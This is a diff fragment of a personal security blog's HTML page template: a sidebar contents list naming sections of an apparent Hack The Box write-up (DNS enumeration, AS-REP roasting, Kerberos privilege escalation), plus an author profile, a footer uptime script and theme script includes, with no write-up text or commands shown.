+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%9E%9A%E4%B8%BE"><span class="nav-number">1.</span> <span class="nav-text">枚举</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#DNS"><span class="nav-number">1.1.</span> <span class="nav-text">DNS</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Squid"><span class="nav-number">1.2.</span> <span class="nav-text">Squid</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#wpad"><span class="nav-number">1.3.</span> <span class="nav-text">wpad</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Rverse-DNS-Lookup"><span class="nav-number">1.4.</span> <span class="nav-text">Rverse DNS Lookup</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%B8%97%E9%80%8F"><span class="nav-number">2.</span> <span class="nav-text">渗透</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#AS-REP-Roasting"><span class="nav-number">2.1.</span> <span class="nav-text">AS-REP-Roasting</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SMTP"><span class="nav-number">2.2.</span> <span class="nav-text">SMTP</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-number">3.</span> <span class="nav-text">提权</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#user"><span class="nav-number">3.1.</span> <span class="nav-text">user</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Kerberos-ticket"><span class="nav-number">3.1.1.</span> <span class="nav-text">Kerberos ticket</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#user2"><span class="nav-number">3.2.</span> <span class="nav-text">user2</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Kerberos-k5login"><span class="nav-number">3.2.1.</span> <span class="nav-text">Kerberos .k5login</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#root"><span class="nav-number">3.3.</span> <span class="nav-text">root</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#beyond-root"><span class="nav-number">4.</span> <span class="nav-text">beyond root</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#sshd-config"><span class="nav-number">4.1.</span> <span class="nav-text">sshd_config</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="EvilArsene"
+      src="/images/touxiang.jpg">
+  <p class="site-author-name" itemprop="name">EvilArsene</p>
+  <div class="site-description" itemprop="description">人格面具操控者 <img src="http://www.hackthebox.eu/badge/image/278745" alt="Hack The Box"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">170</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://weibo.com/TZESS" title="Weibo → https:&#x2F;&#x2F;weibo.com&#x2F;TZESS" rel="noopener" target="_blank"><i class="fa fa-fw fa-weibo"></i>Weibo</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://twitter.com/Arsene_IP" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;Arsene_IP" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">EvilArsene</span>
+</div>
+
+<span id="sitetime"></span>
+<script language=javascript>
+	function siteTime(){
+		window.setTimeout("siteTime()", 1000);
+		var seconds = 1000;
+		var minutes = seconds * 60;
+		var hours = minutes * 60;
+		var days = hours * 24;
+		var years = days * 365;
+		var today = new Date();
+		var todayYear = today.getFullYear();
+		var todayMonth = today.getMonth()+1;
+		var todayDate = today.getDate();
+		var todayHour = today.getHours();
+		var todayMinute = today.getMinutes();
+		var todaySecond = today.getSeconds();
+		/* Date.UTC() -- 返回date对象距世界标准时间(UTC)1970年1月1日午夜之间的毫秒数(时间戳)
+		year - 作为date对象的年份，为4位年份值
+		month - 0-11之间的整数，做为date对象的月份
+		day - 1-31之间的整数，做为date对象的天数
+		hours - 0(午夜24点)-23之间的整数，做为date对象的小时数
+		minutes - 0-59之间的整数，做为date对象的分钟数
+		seconds - 0-59之间的整数，做为date对象的秒数
+		microseconds - 0-999之间的整数，做为date对象的毫秒数 */
+		var t1 = Date.UTC(2018,02,13,15,00,00); //北京时间2018-2-13 00:00:00
+		var t2 = Date.UTC(todayYear,todayMonth,todayDate,todayHour,todayMinute,todaySecond);
+		var diff = t2-t1;
+		var diffYears = Math.floor(diff/years);
+		var diffDays = Math.floor((diff/days)-diffYears*365);
+		var diffHours = Math.floor((diff-(diffYears*365+diffDays)*days)/hours);
+		var diffMinutes = Math.floor((diff-(diffYears*365+diffDays)*days-diffHours*hours)/minutes);
+		var diffSeconds = Math.floor((diff-(diffYears*365+diffDays)*days-diffHours*hours-diffMinutes*minutes)/seconds);
+		document.getElementById("sitetime").innerHTML=" 已安全运行"+(diffYears-2)+" 年 "+diffDays+" 天 "+diffHours+" 小时 "+diffMinutes+" 分钟 "+diffSeconds+" 秒";
+	}/*因为建站时间还没有一年，就将之注释掉了。需要的可以取消*/
+	siteTime();
+</script>
+
+<script>
+console.log(`%c
+. . . . . . . . . . . . . . . . . . . . . . . . . . .
+.                                                   .
+.                      uuuuuuu                      .
+.                  uu$$$$$$$$$$$uu                  .
+.               uu$$$$$$$$$$$$$$$$$uu               .
+.              u$$$$$$$$$$$$$$$$$$$$$u              .
+.             u$$$$$$$$$$$$$$$$$$$$$$$u             .
+.            u$$$$$$$$$$$$$$$$$$$$$$$$$u            .
+.            u$$$$$$$$$$$$$$$$$$$$$$$$$u            .
+.            u$$$$$$"   "$$$"   "$$$$$$u            .
+.            "$$$$"      u$u       $$$$"            .
+.             $$$u       u$u       u$$$             .
+.             $$$u      u$$$u      u$$$             .
+.              "$$$$uu$$$   $$$uu$$$$"              .
+.               "$$$$$$$"   "$$$$$$$"               .
+.                 u$$$$$$$u$$$$$$$u                 .
+.                  u$"$"$"$"$"$"$u                  .
+.       uuu        $$u$ $ $ $ $u$$       uuu        .
+.      u$$$$        $$$$$u$u$u$$$       u$$$$       .
+.       $$$$$uu      "$$$$$$$$$"     uu$$$$$$       .
+.     u$$$$$$$$$$$uu    """""    uuuu$$$$$$$$$$     .
+.     $$$$"""$$$$$$$$$$uuu   uu$$$$$$$$$"""$$$"     .
+.      """      ""$$$$$$$$$$$uu ""$"""              .
+.                uuuu ""$$$$$$$$$$uuu               .
+.       u$$$uuu$$$$$$$$$uu ""$$$$$$$$$$$uuu$$$      .
+.       $$$$$$$$$$""""           ""$$$$$$$$$$$"     .
+.        "$$$$$"                      ""$$$$""      .
+.          $$$"                         $$$$"       .
+.                                                   .
+.               Welcome to Console ;)               .
+. . . . . . . . . . . . . . . . . . . . . . . . . . .`,"color:#9acc14; background:black; font-family: monospace");
+</script>
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script color='' opacity='' zIndex='' count='' src="/lib/canvas-nest/canvas-nest-nomobile.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+  <script defer src="/lib/three/three.min.js"></script>
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
+
+<script type="text/javascript" src="\js\FunnyTitle.js"></script>
